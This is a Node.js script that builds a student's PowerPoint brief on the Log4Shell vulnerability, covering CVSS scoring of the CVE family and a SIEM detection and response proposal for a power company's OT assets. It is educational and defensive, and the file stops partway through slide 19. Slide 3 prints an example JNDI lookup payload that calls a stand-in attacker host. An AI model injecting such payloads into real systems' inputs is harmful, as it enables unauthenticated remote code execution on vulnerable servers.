/*
 * COMP2004 Assessment 2 — native editable PowerPoint of the Log4Shell deck.
 * Mirrors the 21-slide artifact deck; speaker notes are reused from the deck's
 * <aside> notes. Safe Office fonts (Calibri / Consolas) for reliable rendering.
 *
 * Run: NODE_PATH=<pptxgenjs path> node src/build_pptx.js
 * Out: presentation/AStudent_COMP2004_Assignment2_Slides_2026.pptx
 */
const fs = require("fs");
const path = require("path");
const pptxgen = require("pptxgenjs");

const DECK = path.join(__dirname, "..", "presentation", "deck", "project", "slides");
const FIG = path.join(__dirname, "figures");
const OUT = path.join(__dirname, "..", "presentation", "AStudent_COMP2004_Assignment2_Slides_2026.pptx");

// ---- palette ----------------------------------------------------------
const NAVY = "101826", NAVY_CARD = "16233A", PAPER = "F6F8FB", CARD = "FFFFFF";
const INK = "1B2430", BODY = "47515F", BLUE = "2E6FD6", BLUED = "1C5CAB";
const RED = "D14343", AMBER = "C87A1E", MUTE = "8A97A8";
const ONDARK = "B9C4D4", ONDARKH = "EEF3FA", GREEN = "1BAF7A", LINE = "DDE3EC";
const F = "Calibri", MONO = "Consolas";

// ---- speaker notes from the deck --------------------------------------
function notes(id) {
  try {
    const html = fs.readFileSync(path.join(DECK, id + ".html"), "utf8");
    const m = html.match(/<aside>([\s\S]*?)<\/aside>/);
    if (!m) return "";
    return m[1].replace(/<[^>]+>/g, "")
      .replace(/&amp;/g, "&").replace(/&#8217;/g, "’").replace(/&#8209;/g, "-")
      .replace(/&#8212;/g, "—").replace(/&#8211;/g, "–").replace(/&#8230;/g, "…")
      .replace(/&#160;/g, " ").replace(/&lt;/g, "<").replace(/&gt;/g, ">")
      .replace(/\s+/g, " ").trim();
  } catch (e) { return ""; }
}

const pres = new pptxgen();
pres.defineLayout({ name: "W", width: 13.333, height: 7.5 });
pres.layout = "W";
pres.author = "COMP2004 student";
pres.title = "Log4Shell — CVSS & SIEM";
const W = 13.333, H = 7.5, M = 0.6;

// ---- helpers ----------------------------------------------------------
function slide(id, bg) {
  const s = pres.addSlide();
  s.background = { color: bg || PAPER };
  const n = notes(id);
  if (n) s.addNotes(n);
  return s;
}
function eyebrow(s, text, dark) {
  s.addText(text.toUpperCase(), { x: M, y: 0.45, w: W - 2 * M, h: 0.35, isTextBox: true,
    fontFace: MONO, fontSize: 12, bold: true, charSpacing: 2, color: dark ? "7FA8E6" : BLUED, margin: 0 });
}
function title(s, text, dark, size) {
  s.addText(text, { x: M, y: 0.78, w: W - 2 * M, h: 1.1, isTextBox: true,
    fontFace: F, fontSize: size || 33, bold: true, color: dark ? "FFFFFF" : INK, margin: 0, lineSpacingMultiple: 1.02 });
}
function card(s, x, y, w, h, opt = {}) {
  s.addShape(pres.ShapeType.roundRect, { x, y, w, h, rectRadius: 0.09,
    fill: { color: opt.fill || CARD }, line: opt.line ? { color: opt.line, width: opt.lw || 1 } : { type: "none" },
    shadow: opt.shadow ? { type: "outer", color: "9AA3B0", blur: 6, offset: 2, angle: 90, opacity: 0.25 } : undefined });
}
function txt(s, t, o) { s.addText(t, Object.assign({ isTextBox: true, fontFace: F, margin: 0 }, o)); }

// ============================================================ 1 COVER
{
  const s = slide("cover", NAVY);
  eyebrow(s, "COMP2004 · Assessment 2 · SOC Analyst brief", true);
  txt(s, "The Log4Shell Vulnerability", { x: M, y: 1.9, w: 11.5, h: 2.2, fontSize: 60, bold: true, color: "FFFFFF", lineSpacingMultiple: 1.0 });
  txt(s, [
    { text: "CVSS analysis & a SIEM proposal for a ", options: { color: ONDARK } },
    { text: "power company", options: { color: ONDARKH, bold: true } },
    { text: "  —  CVE-2021-44228 and its family", options: { color: ONDARK } },
  ], { x: M, y: 4.15, w: 11.8, h: 0.9, fontSize: 22 });
  txt(s, [
    { text: "Presented by ", options: { color: MUTE } }, { text: "A. Student", options: { color: ONDARKH, bold: true } },
    { text: "        Security Operations Centre        24 September 2026", options: { color: MUTE } },
  ], { x: M, y: 6.5, w: 12, h: 0.4, fontSize: 14 });
}

// ============================================================ 2 AGENDA
{
  const s = slide("agenda");
  eyebrow(s, "Agenda"); title(s, "What this brief covers");
  const cols = [
    { t: "Task 1", c: BLUE, h: "CVSS analysis", items: ["How the flaw works", "Base metrics → a score of 10.0", "Temporal & environmental context", "v2.0 vs v3.1 vs v4.0"] },
    { t: "Task 2", c: RED, h: "SIEM proposal", items: ["Which platform, and why in context", "Inputs — what to ingest", "Insights — what to detect", "Actions — what to do, plus a demo"] },
  ];
  cols.forEach((col, i) => {
    const x = M + i * 6.2;
    card(s, x, 2.1, 5.9, 4.4, { shadow: true });
    s.addShape(pres.ShapeType.roundRect, { x, y: 2.1, w: 5.9, h: 0.12, rectRadius: 0.05, fill: { color: col.c }, line: { type: "none" } });
    txt(s, col.t, { x: x + 0.4, y: 2.4, w: 5, h: 0.5, fontFace: MONO, fontSize: 20, bold: true, color: col.c });
    txt(s, col.h, { x: x + 0.4, y: 2.95, w: 5.1, h: 0.6, fontSize: 26, bold: true, color: INK });
    txt(s, col.items.map(t => ({ text: t, options: { bullet: { indent: 18 }, breakLine: true } })), { x: x + 0.4, y: 3.7, w: 5.1, h: 2.5, fontSize: 18, color: BODY, paraSpaceAfter: 8 });
  });
}

// ============================================================ 3 WHATIS
{
  const s = slide("whatis");
  eyebrow(s, "The flaw in one sentence");
  title(s, "A logging library that runs code hidden inside the data it logs", false, 30);
  card(s, M, 2.15, W - 2 * M, 1.95, { fill: NAVY });
  txt(s, "An attacker sends a string like this in any input that gets logged — a header, a form field, a username:", { x: M + 0.4, y: 2.35, w: 11.4, h: 0.5, fontSize: 15, color: MUTE });
  txt(s, "${jndi:ldap://attacker.example/x}", { x: M + 0.4, y: 2.85, w: 11.4, h: 0.55, fontFace: MONO, fontSize: 24, bold: true, color: "7FD1A8" });
  txt(s, [
    { text: "Vulnerable Log4j 2 (2.0-beta9 – 2.15.0) ", options: { color: ONDARK } },
    { text: "expands the lookup", options: { color: ONDARKH, bold: true } },
    { text: ", the server fetches a remote Java class, and runs it. Result: unauthenticated remote code execution.", options: { color: ONDARK } },
  ], { x: M + 0.4, y: 3.4, w: 11.4, h: 0.6, fontSize: 15 });
  const facts = [["Identifier", "CVE-2021-44228", true], ["Weakness", "CWE-917 (expression injection)", false], ["ATT&CK", "T1190 Public-facing app", false]];
  facts.forEach((fct, i) => {
    const x = M + i * 4.12;
    card(s, x, 4.4, 3.9, 1.5, { line: LINE });
    txt(s, fct[0], { x: x + 0.3, y: 4.6, w: 3.4, h: 0.35, fontSize: 13, color: MUTE });
    txt(s, fct[1], { x: x + 0.3, y: 4.98, w: 3.45, h: 0.8, fontSize: fct[2] ? 20 : 18, bold: true, color: INK, fontFace: fct[2] ? MONO : F });
  });
}

// ============================================================ 4 CHAIN
{
  const s = slide("chain", NAVY);
  eyebrow(s, "How the attack unfolds", true);
  title(s, "Five steps — and the server does most of them itself", true, 28);
  const steps = [
    ["1", "Crafted input", "Attacker puts a JNDI lookup in a logged field", true],
    ["2", "Log4j logs it", "Vulnerable version evaluates the expression", false],
    ["3", "Outbound lookup", "Server calls out over LDAP / RMI / DNS", false],
    ["4", "Malicious class", "Attacker's server returns a code reference", true],
    ["5", "Code executes", "JVM runs it — shells, miners, ransomware", false],
  ];
  const cw = 2.28, gap = 0.14, y = 2.2, ch = 2.9;
  steps.forEach((st, i) => {
    const x = M + i * (cw + gap);
    const acc = st[3] ? RED : BLUE;
    card(s, x, y, cw, ch, { fill: NAVY_CARD, line: acc, lw: 1.5 });
    txt(s, st[0], { x: x + 0.25, y: y + 0.22, w: 1, h: 0.5, fontFace: MONO, fontSize: 24, bold: true, color: st[3] ? "EE8888" : "7FA8E6" });
    txt(s, st[1], { x: x + 0.25, y: y + 0.85, w: cw - 0.5, h: 0.8, fontSize: 17, bold: true, color: ONDARKH });
    txt(s, st[2], { x: x + 0.25, y: y + 1.6, w: cw - 0.5, h: 1.1, fontSize: 12.5, color: ONDARK });
  });
  txt(s, [
    { text: "Red", options: { color: "EE8888", bold: true } }, { text: " = attacker-controlled        ", options: { color: MUTE } },
    { text: "Blue", options: { color: "7FA8E6", bold: true } }, { text: " = the victim server acting on its own", options: { color: MUTE } },
  ], { x: M, y: 5.4, w: 12, h: 0.4, fontSize: 14 });
  txt(s, "Steps 2, 3 and 5 all happen inside your own infrastructure — which is exactly why a SIEM can see them.", { x: M, y: 6.05, w: 12, h: 0.5, fontSize: 15, italic: true, color: "6E7A8C" });
}

// ============================================================ 5 SCALE
{
  const s = slide("scale");
  eyebrow(s, "Why it mattered"); title(s, "One of the most serious vulnerabilities in history", false, 30);
  const stats = [["35k+", "Java packages affected — over 8% of Maven Central, mostly via deep dependencies"], ["<24h", "From disclosure to mass, automated exploitation and weaponised exploit code"], ["10yr", "An “endemic” flaw — the Cyber Safety Review Board expects exploitation into the 2030s"]];
  stats.forEach((st, i) => {
    const x = M + i * 4.12;
    card(s, x, 2.15, 3.9, 2.0, { line: LINE });
    txt(s, st[0], { x: x + 0.3, y: 2.35, w: 3.4, h: 0.9, fontFace: MONO, fontSize: 40, bold: true, color: BLUE });
    txt(s, st[1], { x: x + 0.3, y: 3.25, w: 3.45, h: 0.85, fontSize: 13.5, color: BODY });
  });
  card(s, M, 4.5, W - 2 * M, 1.7, { fill: NAVY });
  txt(s, "“One of the most serious I've seen in my entire career, if not the most serious.”", { x: M + 0.45, y: 4.75, w: 11.3, h: 0.9, fontSize: 22, italic: true, color: ONDARKH });
  txt(s, "— Jen Easterly, Director, CISA (December 2021)", { x: M + 0.45, y: 5.65, w: 11.3, h: 0.4, fontSize: 14, color: MUTE });
}

// ============================================================ 6 SCENARIO
{
  const s = slide("scenario", NAVY);
  eyebrow(s, "Our scenario", true);
  title(s, "A power company running Java deep in its control systems", true, 28);
  txt(s, "Four assets in scope use Java or embed Log4j — and they don't sit on the corporate LAN, they run the grid. That context drives every score and every SIEM decision that follows.", { x: M, y: 1.9, w: 12.1, h: 0.8, fontSize: 15, color: ONDARK });
  const assets = [["IT / OT boundary", "SIMATIC IT Report Manager V6.7", "Java reporting product, network-reachable"], ["SCADA / EMS core", "OPC UA Java Stack", "Speaks to controllers; deep, segmented"], ["Substation edge", "Siemens Connect X200 / X300", "Telecontrol gateways, remotely reachable"]];
  assets.forEach((a, i) => {
    const x = M + i * 4.12, y = 2.85, cw = 3.9;
    card(s, x, y, cw, 2.0, { fill: NAVY_CARD, line: "34405A" });
    txt(s, a[0], { x: x + 0.3, y: y + 0.22, w: cw - 0.6, h: 0.4, fontFace: MONO, fontSize: 13, color: "7FA8E6" });
    txt(s, a[1], { x: x + 0.3, y: y + 0.62, w: cw - 0.6, h: 0.8, fontSize: 17, bold: true, color: ONDARKH });
    txt(s, a[2], { x: x + 0.3, y: y + 1.42, w: cw - 0.6, h: 0.5, fontSize: 13, color: ONDARK });
  });
  card(s, M, 5.15, W - 2 * M, 1.35, { fill: "3A2320" });
  txt(s, [
    { text: "Why this raises the stakes:  ", options: { bold: true, color: ONDARKH } },
    { text: "a compromise here is not data loss — it is loss of view and control over physical grid equipment. Integrity and availability carry safety consequences.", options: { color: ONDARKH } },
  ], { x: M + 0.4, y: 5.35, w: 11.9, h: 0.95, fontSize: 15 });
}

// ============================================================ 7 VULNS
{
  const s = slide("vulns");
  eyebrow(s, "Task 1a — the vulnerabilities in scope");
  title(s, "It is not one CVE — it is a family, and patches created new ones", false, 26);
  const rows = [
    [{ text: "CVE", options: { bold: true, color: "FFFFFF" } }, { text: "My score", options: { bold: true, color: "FFFFFF" } }, { text: "Nature", options: { bold: true, color: "FFFFFF" } }, { text: "Fixed in", options: { bold: true, color: "FFFFFF" } }],
    ["CVE-2021-44228 (Log4Shell)", "10.0 Critical", "Unauthenticated RCE via JNDI lookup", "2.15.0"],
    ["CVE-2021-45046", "9.0 Critical", "RCE — the 2.15.0 fix was incomplete", "2.16.0"],
    ["CVE-2021-45105", "5.9 Medium", "Denial of service via recursive lookups", "2.17.0"],
    ["CVE-2021-44832", "6.6 Medium", "RCE via JDBC Appender (needs config control)", "2.17.1"],
  ];
  const tRows = rows.map((r, ri) => r.map((c, ci) => {
    const base = { fontFace: F, fontSize: 15, valign: "middle", margin: [4, 6, 4, 6] };
    if (ri === 0) return { text: c.text, options: Object.assign({}, base, { fill: { color: NAVY }, color: "FFFFFF" }) };
    const scoreCol = ci === 1 ? (ri <= 2 ? RED : AMBER) : INK;
    return { text: c, options: Object.assign({}, base, { fill: { color: ri % 2 ? CARD : "F0F3F8" }, color: scoreCol, bold: ci === 0 || ci === 1 }) };
  }));
  s.addTable(tRows, { x: M, y: 2.15, w: W - 2 * M, colW: [3.6, 1.9, 4.9, 1.73], border: { type: "solid", color: LINE, pt: 1 }, autoPage: false });
  card(s, M, 5.55, W - 2 * M, 1.1, { fill: "EAF2FC" });
  txt(s, [
    { text: "In our scenario each must be triaged against ", options: { color: INK } },
    { text: "SIMATIC Report Manager, the OPC UA Java stack and the Connect gateways", options: { bold: true, color: INK } },
    { text: " via Siemens ProductCERT advisories — patching to 2.17.1, not just 2.15.0, is the real finish line.", options: { color: INK } },
  ], { x: M + 0.4, y: 5.72, w: 11.9, h: 0.8, fontSize: 15 });
}

// ============================================================ 8 CVSS-INTRO
{
  const s = slide("cvss-intro", NAVY);
  eyebrow(s, "Task 1", true); title(s, "Scoring it with CVSS", true, 40);
  txt(s, "The Common Vulnerability Scoring System (FIRST) rates severity from 0.0 to 10.0 across three metric groups.", { x: M, y: 2.15, w: 12, h: 0.7, fontSize: 17, color: ONDARK });
  const groups = [["Base", "The intrinsic, constant qualities of the flaw. Constant everywhere.", "7FA8E6"], ["Temporal", "How the real-world threat evolves — exploit maturity, fixes.", ONDARK], ["Environmental", "Tailored to your deployment — where the flaw actually lives.", ONDARK]];
  groups.forEach((g, i) => {
    const x = M + i * 4.12, y = 3.1;
    card(s, x, y, 3.9, 2.6, { fill: NAVY_CARD, line: i === 0 ? BLUE : "34405A", lw: i === 0 ? 1.5 : 1 });
    txt(s, g[0], { x: x + 0.35, y: y + 0.3, w: 3.3, h: 0.6, fontSize: 24, bold: true, color: g[2] });
    txt(s, g[1], { x: x + 0.35, y: y + 1.0, w: 3.3, h: 1.4, fontSize: 15, color: ONDARK });
  });
}

// ============================================================ 9 BASE
{
  const s = slide("base");
  eyebrow(s, "Base metrics — my determination");
  title(s, "Every metric, justified from how it works", false, 28);
  txt(s, "10.0", { x: 10.6, y: 0.6, w: 2.1, h: 0.9, fontFace: MONO, fontSize: 44, bold: true, color: RED, align: "right" });
  txt(s, "CRITICAL", { x: 10.6, y: 1.5, w: 2.1, h: 0.3, fontSize: 13, bold: true, color: RED, align: "right" });
  const rows = [
    ["Metric", "Value", "Why I chose it"],
    ["Attack Vector", "Network", "Reachable across the network via any logged input"],
    ["Attack Complexity", "Low", "One request; reliable public exploits, no special conditions"],
    ["Privileges Required", "None", "No account or authentication needed"],
    ["User Interaction", "None", "Logging is automatic — no victim action"],
    ["Scope", "Changed", "Breaks out of the library to the host and beyond"],
    ["C / I / A impact", "High / High / High", "Full code execution — total data, integrity & uptime loss"],
  ];
  const tRows = rows.map((r, ri) => r.map((c, ci) => {
    const base = { fontFace: F, fontSize: 14.5, valign: "middle", margin: [3, 6, 3, 6] };
    if (ri === 0) return { text: c, options: Object.assign({}, base, { fill: { color: NAVY }, color: "FFFFFF", bold: true }) };
    return { text: c, options: Object.assign({}, base, { fill: { color: ri % 2 ? CARD : "F0F3F8" }, color: INK, bold: ci === 1 }) };
  }));
  s.addTable(tRows, { x: M, y: 2.15, w: W - 2 * M, colW: [2.7, 2.3, 7.13], border: { type: "solid", color: LINE, pt: 1 }, autoPage: false });
  card(s, M, 6.35, W - 2 * M, 0.75, { fill: NAVY });
  txt(s, [
    { text: "Vector string:   ", options: { color: MUTE, fontFace: F } },
    { text: "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", options: { color: "7FD1A8", bold: true, fontFace: MONO } },
  ], { x: M + 0.4, y: 6.5, w: 12, h: 0.45, fontSize: 17 });
}

// ============================================================ 10 TEMPORAL
{
  const s = slide("temporal");
  eyebrow(s, "Temporal metrics"); title(s, "How the threat looked in December 2021", false, 28);
  txt(s, "9.5", { x: 10.9, y: 0.6, w: 1.8, h: 0.9, fontFace: MONO, fontSize: 42, bold: true, color: RED, align: "right" });
  txt(s, "CRITICAL", { x: 10.9, y: 1.5, w: 1.8, h: 0.3, fontSize: 13, bold: true, color: RED, align: "right" });
  const m = [["E: High", "Exploit maturity", "Weaponised exploits & mass scanning within a day"], ["RL: Official", "Remediation", "A vendor fix exists — the only thing pulling the score down"], ["RC: Confirmed", "Report confidence", "Vendor-confirmed, reproduced worldwide"]];
  m.forEach((g, i) => {
    const x = M + i * 4.12, y = 2.35;
    card(s, x, y, 3.9, 2.3, { line: LINE });
    txt(s, g[0], { x: x + 0.3, y: y + 0.25, w: 3.4, h: 0.5, fontFace: MONO, fontSize: 18, bold: true, color: BLUE });
    txt(s, g[1], { x: x + 0.3, y: y + 0.8, w: 3.4, h: 0.4, fontSize: 17, bold: true, color: INK });
    txt(s, g[2], { x: x + 0.3, y: y + 1.25, w: 3.4, h: 0.9, fontSize: 13.5, color: BODY });
  });
  card(s, M, 5.05, W - 2 * M, 1.4, { fill: NAVY });
  txt(s, [
    { text: "Adds to the string:   ", options: { color: MUTE } },
    { text: "…/E:H/RL:O/RC:C", options: { color: "7FD1A8", bold: true, fontFace: MONO } },
  ], { x: M + 0.4, y: 5.25, w: 11.9, h: 0.45, fontSize: 17 });
  txt(s, "Before any patch existed, RL:U put this at the full 10.0.", { x: M + 0.4, y: 5.8, w: 11.9, h: 0.5, fontSize: 15, color: ONDARK });
}

// ============================================================ 11 ENVIRONMENTAL
{
  const s = slide("environmental", NAVY);
  eyebrow(s, "Environmental — where context changes the score", true);
  title(s, "Same flaw, three of our assets, three priorities", true, 27);
  txt(s, [
    { text: "For all three I set ", options: { color: ONDARK } },
    { text: "IR:High and AR:High", options: { color: ONDARKH, bold: true } },
    { text: " — corrupted control data or lost availability threatens the grid. Segmentation only changes how reachable each one is.", options: { color: ONDARK } },
  ], { x: M, y: 1.85, w: 12.1, h: 0.7, fontSize: 15 });
  const a = [
    ["SIMATIC Report Mgr", "9.5", "EE8888", RED, "Exposed at the IT/OT boundary — no mitigation. Critical. Fix first.", "/CR:M/IR:H/AR:H"],
    ["Connect X200/X300", "8.7", "E8B368", AMBER, "Remote but hardened telecontrol edge. High.", "…/MAC:H"],
    ["OPC UA Java stack", "8.0", "E8B368", AMBER, "Deep in segmented OT, adjacent-only. High.", "…/MAV:A/MAC:H"],
  ];
  a.forEach((c, i) => {
    const x = M + i * 4.12, y = 2.75, cw = 3.9;
    card(s, x, y, cw, 2.5, { fill: NAVY_CARD, line: c[3], lw: 1.3 });
    txt(s, c[0], { x: x + 0.3, y: y + 0.25, w: 2.5, h: 0.8, fontSize: 17, bold: true, color: ONDARKH });
    txt(s, c[1], { x: x + cw - 1.3, y: y + 0.2, w: 1.1, h: 0.7, fontFace: MONO, fontSize: 30, bold: true, color: c[2], align: "right" });
    txt(s, c[4], { x: x + 0.3, y: y + 1.15, w: cw - 0.6, h: 0.9, fontSize: 13, color: ONDARK });
    txt(s, c[5], { x: x + 0.3, y: y + 2.05, w: cw - 0.6, h: 0.35, fontFace: MONO, fontSize: 12, color: "7FA8E6" });
  });
  card(s, M, 5.5, W - 2 * M, 1.15, { fill: "3A2320" });
  txt(s, [
    { text: "The lesson:  ", options: { bold: true, color: ONDARKH } },
    { text: "in OT you cannot deprioritise the way you would an IT box — segmentation lowers exploitability, but High integrity/availability requirements keep every asset at least High.", options: { color: ONDARKH } },
  ], { x: M + 0.4, y: 5.67, w: 11.9, h: 0.85, fontSize: 14.5 });
}

// ============================================================ 12 VERSIONS (fig2)
{
  const s = slide("versions");
  eyebrow(s, "Putting it together"); title(s, "One flaw, every version and metric group", false, 28);
  s.addImage({ path: path.join(FIG, "fig2_cvss_scores.png"), x: M, y: 2.15, w: 8.1, h: 8.1 * 944 / 2112, sizing: { type: "contain", w: 8.1, h: 4.3 } });
  const notes2 = [["v2.0 → 9.3", "No Scope metric, so it can't reward the break-out — lands below 10."], ["v3.1 → 10.0", "Adds Scope; the version I based my analysis on."], ["v4.0 → 10.0", "Splits impact into vulnerable vs. subsequent systems — still max."]];
  notes2.forEach((n, i) => {
    const y = 2.35 + i * 1.15;
    txt(s, n[0], { x: 9.0, y, w: 3.7, h: 0.4, fontSize: 18, bold: true, color: INK });
    txt(s, n[1], { x: 9.0, y: y + 0.4, w: 3.7, h: 0.8, fontSize: 13, color: BODY });
  });
  card(s, 9.0, 5.9, 3.73, 0.85, { fill: "EAF2FC" });
  txt(s, [{ text: "Always cite the version", options: { bold: true } }, { text: " — the same flaw reads 9.3 or 10.0.", options: {} }], { x: 9.2, y: 6.05, w: 3.4, h: 0.6, fontSize: 13, color: INK });
}

// ============================================================ 13 SIEM-WHY
{
  const s = slide("siem-why", NAVY);
  eyebrow(s, "Task 2", true); title(s, "Why a SIEM — and which one for us", true, 34);
  card(s, M, 2.0, W - 2 * M, 1.5, { fill: NAVY_CARD });
  txt(s, [
    { text: "No single log proves Log4Shell. A web log shows the payload; a firewall log shows the odd LDAP callout; an OT sensor shows the gateway acting strangely. ", options: { color: ONDARKH } },
    { text: "The SIEM is the one place those line up — on one asset, within seconds.", options: { color: ONDARKH, bold: true } },
  ], { x: M + 0.4, y: 2.2, w: 11.9, h: 1.1, fontSize: 17 });
  const c = [["Proposed: Splunk Enterprise Security", "Risk-based alerting, published Log4Shell detections, ATT&CK mapping, OT add-on. Reproducible free in the demo with Wazuh / Elastic."], ["Paired with an OT sensor", "Passive monitoring (e.g. Nozomi / Claroty) feeds the SIEM, because EDR agents can't be installed on controllers or the Connect gateways."]];
  c.forEach((k, i) => {
    const x = M + i * 6.15, y = 3.8;
    card(s, x, y, 5.85, 2.4, { fill: NAVY_CARD, line: i === 0 ? BLUE : "34405A", lw: i === 0 ? 1.4 : 1 });
    txt(s, k[0], { x: x + 0.35, y: y + 0.3, w: 5.2, h: 0.7, fontSize: 18, bold: true, color: "7FA8E6" });
    txt(s, k[1], { x: x + 0.35, y: y + 1.05, w: 5.2, h: 1.2, fontSize: 14, color: ONDARK });
  });
}

// ============================================================ 14 SIEM-ARCH (fig3)
{
  const s = slide("siem-arch");
  eyebrow(s, "Reference architecture"); title(s, "From IT and OT log sources to SOC action", false, 28);
  s.addImage({ path: path.join(FIG, "fig3_siem_architecture.png"), x: M, y: 2.0, w: W - 2 * M, h: (W - 2 * M) * 936 / 2000, sizing: { type: "contain", w: W - 2 * M, h: 4.2 } });
  txt(s, [
    { text: "The next three slides drill into the pipeline: its ", options: { color: "6E7A8C" } },
    { text: "inputs", options: { color: INK, bold: true } }, { text: ", its ", options: { color: "6E7A8C" } },
    { text: "insights", options: { color: INK, bold: true } }, { text: ", and its ", options: { color: "6E7A8C" } },
    { text: "actions", options: { color: INK, bold: true } }, { text: ".", options: { color: "6E7A8C" } },
  ], { x: M, y: 6.6, w: 12, h: 0.4, fontSize: 14 });
}

// ============================================================ 15 INPUTS
{
  const s = slide("inputs");
  eyebrow(s, "1 · SIEM inputs"); title(s, "What must we ingest — and why", false, 28);
  const rows = [
    ["Data input", "Why it is critical for this incident"],
    ["Web / app & WAF logs (SIMATIC, Java apps)", "The ${jndi:…} payload arrives here first — headers and obfuscated forms"],
    ["IT–OT boundary firewall & proxy", "Server-initiated egress to LDAP/RMI — a tell an OT box should never make"],
    ["DNS query logs", "JNDI callbacks resolve attacker/canary domains — visible even when encrypted"],
    ["OT telemetry (Connect syslog, OPC UA, historian)", "Passive-sensor data where no agent can run — unexpected gateway behaviour"],
    ["Endpoint / EDR / Sysmon / auditd", "Java spawning a shell or downloader — proof an attempt succeeded"],
    ["Vuln scan / SBOM inventory", "Which assets actually run vulnerable Log4j — turns an alert into a prioritised one"],
  ];
  const tRows = rows.map((r, ri) => r.map((c, ci) => {
    const base = { fontFace: F, fontSize: 14, valign: "middle", margin: [3, 6, 3, 6] };
    if (ri === 0) return { text: c, options: Object.assign({}, base, { fill: { color: NAVY }, color: "FFFFFF", bold: true }) };
    return { text: c, options: Object.assign({}, base, { fill: { color: ri % 2 ? CARD : "F0F3F8" }, color: ci === 0 ? INK : BODY, bold: ci === 0 }) };
  }));
  s.addTable(tRows, { x: M, y: 2.15, w: W - 2 * M, colW: [5.0, 7.13], border: { type: "solid", color: LINE, pt: 1 }, autoPage: false });
}

// ============================================================ 16 INSIGHTS
{
  const s = slide("insights");
  eyebrow(s, "2 · SIEM insights"); title(s, "What must it detect — and why", false, 28);
  txt(s, "Layered on purpose: signatures catch the noisy scanning; behaviour catches the quiet attacker who evades the string but still must call out or execute.", { x: M, y: 1.75, w: 12.1, h: 0.6, fontSize: 14, color: BODY });
  const ins = [
    ["I1", "Inbound JNDI payload (signature)", "Detect ${jndi:…} and its encodings in web traffic — catches mass exploitation. ATT&CK T1190", BLUE, false],
    ["I2", "Server-initiated LDAP/RMI egress (behaviour)", "A Java server or gateway calling out to 389/636/1099 — almost never legitimate in OT. T1071 / T1105", BLUE, false],
    ["I3", "Correlated payload + callback (high confidence)", "Same host receives a payload and then calls out within minutes — two weak signals, one strong alert", RED, true],
    ["I4", "Suspicious child of Java (post-exploitation)", "java spawning a shell, curl or an unknown binary — the trigger for isolation. T1059", BLUE, false],
  ];
  ins.forEach((k, i) => {
    const y = 2.45 + i * 1.08;
    card(s, M, y, W - 2 * M, 0.95, { fill: k[4] ? "EAF2FC" : CARD, line: k[4] ? BLUE : LINE });
    txt(s, k[0], { x: M + 0.25, y: y + 0.28, w: 0.8, h: 0.5, fontFace: MONO, fontSize: 20, bold: true, color: k[3] });
    txt(s, k[1], { x: M + 1.15, y: y + 0.13, w: 10.6, h: 0.4, fontSize: 16, bold: true, color: INK });
    txt(s, k[2], { x: M + 1.15, y: y + 0.5, w: 10.7, h: 0.4, fontSize: 12.5, color: BODY });
  });
}

// ============================================================ 17 ACTIONS
{
  const s = slide("actions", NAVY);
  eyebrow(s, "3 · SIEM actions", true); title(s, "What must it do — and why", true, 28);
  txt(s, [
    { text: "In OT, automation is ", options: { color: ONDARK } },
    { text: "safety-gated", options: { color: ONDARKH, bold: true } },
    { text: ": block at the IT/OT boundary, never auto-isolate a live controller. A human confirms before anything touches the grid.", options: { color: ONDARK } },
  ], { x: M, y: 1.85, w: 12.1, h: 0.7, fontSize: 15 });
  const cols = [
    ["Contain", ["SOAR blocks the source IP at the boundary", "Deny the outbound LDAP/RMI callback", "Isolate IT hosts; quarantine OT only with operator sign-off"]],
    ["Enrich & prioritise", ["Cross-check the SBOM: is this asset vulnerable?", "Attach CVSS environmental score & Purdue zone", "Auto-raise severity for the exposed SIMATIC box"]],
    ["Respond & report", ["Open an IR ticket, notify on-call & OT engineers", "Retro-hunt stored logs for earlier attempts", "Evidence trail for NIST SP 800-61r3 & audit"]],
  ];
  cols.forEach((c, i) => {
    const x = M + i * 4.12, y = 2.75;
    card(s, x, y, 3.9, 3.5, { fill: NAVY_CARD, line: "34405A" });
    txt(s, c[0], { x: x + 0.3, y: y + 0.25, w: 3.3, h: 0.5, fontSize: 19, bold: true, color: "7FA8E6" });
    txt(s, c[1].map(t => ({ text: t, options: { bullet: { indent: 15 }, breakLine: true } })), { x: x + 0.3, y: y + 0.9, w: 3.35, h: 2.4, fontSize: 13.5, color: ONDARK, paraSpaceAfter: 7 });
  });
}

// ============================================================ 18 DEMO
{
  const s = slide("demo");
  eyebrow(s, "The demonstration"); title(s, "Detecting an attempt, end to end", false, 28);
  txt(s, "Isolated lab only: a deliberately vulnerable Java service, an attacker host, and a free SIEM. Documentation IP ranges, reserved domains — nothing live is touched.", { x: M, y: 1.75, w: 12.1, h: 0.6, fontSize: 14, color: BODY });
  const steps = [["1", "Baseline", "Dashboards quiet; normal traffic"], ["2", "Attempt", "Send the JNDI payload in a header"], ["3", "Signature fires", "Insight I1 — show the request"], ["4", "Correlation", "Callback + payload → I3 alert"], ["5", "Respond", "Triage, confirm, SOAR playbook"]];
  const cw = 2.28, gap = 0.14, y = 2.5;
  steps.forEach((st, i) => {
    const x = M + i * (cw + gap);
    card(s, x, y, cw, 2.0, { line: LINE });
    txt(s, st[0], { x: x + 0.25, y: y + 0.2, w: 1, h: 0.5, fontFace: MONO, fontSize: 22, bold: true, color: i === 4 ? RED : BLUE });
    txt(s, st[1], { x: x + 0.25, y: y + 0.8, w: cw - 0.5, h: 0.5, fontSize: 16, bold: true, color: INK });
    txt(s, st[2], { x: x + 0.25, y: y + 1.3, w: cw - 0.5, h: 0.6, fontSize: 12.5, color: BODY });
  });
  card(s, M, 4.9, W - 2 * M, 1.0, { fill: NAVY });
  txt(s, [
    { text: "Recording:  ", options: { color: MUTE } },
    { text: "Zoom — camera on, student ID shown — link inserted with submission", options: { color: ONDARKH } },
  ], { x: M + 0.4, y: 5.15, w: 12, h: 0.5, fontSize: 15 });
}

// ============================================================ 19 PROSCONS
{
  const s = slide("proscons", NAVY);
  eyebrow(s, "Honest appraisal", true); title(s, "What the SIEM gives us — and its limits", true, 28);
  const benefits = ["Cross-source correlation single tools can't do", "Lower MTTD/MTTR; retrospective threat hunting", "Threat-intel enrichment (KEV, ProductCERT)", "Audit trail for NIST 800-61r3 & Essential Eight"];
  const limits = ["Sees only what's ingested → onboarding checklist", "Signature noise → risk-based & correlated rules", "Encryption/evasion → behavioural detections", "No agents on OT → passive sensor feed"];
  [["Benefits", benefits, BLUE, "7FA8E6"], ["Limits — and our mitigations", limits, AMBER, "E8B368"]].forEach((col, i) => {
    const x = M + i * 6.15, y = 2.2;
    card(s, x, y, 5.85, 3.9, { fill: NAVY_CARD });
